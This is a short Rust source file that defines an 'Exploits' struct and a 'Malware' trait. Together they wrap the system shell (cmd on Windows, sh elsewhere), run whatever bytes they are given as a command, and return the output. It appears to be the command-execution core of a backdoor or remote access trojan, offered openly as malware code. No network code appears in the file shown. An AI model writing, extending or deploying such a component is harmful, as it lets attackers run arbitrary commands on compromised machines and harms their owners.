use std::ffi::OsString;
use std::process::Command;

#[derive(Debug)]
pub struct Exploits {
    exploit_input: Vec<u8>,
    exploit_output: Vec<u8>,
    shell: Command,
    last_cmd: OsString,
}

impl Exploits {
    pub fn default() -> Exploits {
        Exploits {
            exploit_input: vec![],
            exploit_output: vec![],
            shell: Exploits::shell(),
            last_cmd: OsString::from(""),
        }
    }

    pub fn shell() -> Command {
        if cfg!(target_os = "windows") {
            Command::new("cmd")
        } else {
            Command::new("sh")
        }
    }
}

pub trait Malware {
    fn execute(&mut self) -> Self;
    fn get_output(&mut self) -> Vec<u8>;
    fn get_last_cmd(&mut self) -> OsString;
    fn command(&mut self, command: Vec<u8>, last_cmd: OsString) -> Exploits;
}

impl Malware for Exploits {
    fn execute(&mut self) -> Self {
        let mut exploit_input =
            String::from_utf8(self.exploit_input.clone()).unwrap_or_else(|_| "".to_string());

        // if (self.last_cmd != OsString::from(exploit_input.clone()) && !self.last_cmd.is_empty()) {
        //     exploit_input = format!("{:?}&{}", self.last_cmd, exploit_input).replace('"', "")
        // }

        // println!("{:?}", self.last_cmd);
        // println!("{}", exploit_input);

        let exploit_output = self
            .shell
            .args(["/k", &exploit_input])
            .output()
            .expect("failed to execute process");

        let exploit_output = match exploit_output.stdout.is_empty() {
            true => exploit_output.stderr,
            false => exploit_output.stdout,
        };

        Self {
            exploit_input: vec![],
            exploit_output,
            shell: Exploits::shell(),
            last_cmd: self.shell.get_args().collect::<Vec<_>>()[1].to_os_string(),
        }
    }

    fn get_output(&mut self) -> Vec<u8> {
        self.exploit_output.clone()
    }

    fn get_last_cmd(&mut self) -> OsString {
        self.last_cmd.clone()
    }

    fn command(&mut self, exploit_input: Vec<u8>, last_cmd: OsString) -> Exploits {
        Exploits {
            exploit_input,
            exploit_output: vec![],
            shell: Exploits::shell(),
            last_cmd,
        }
    }
}
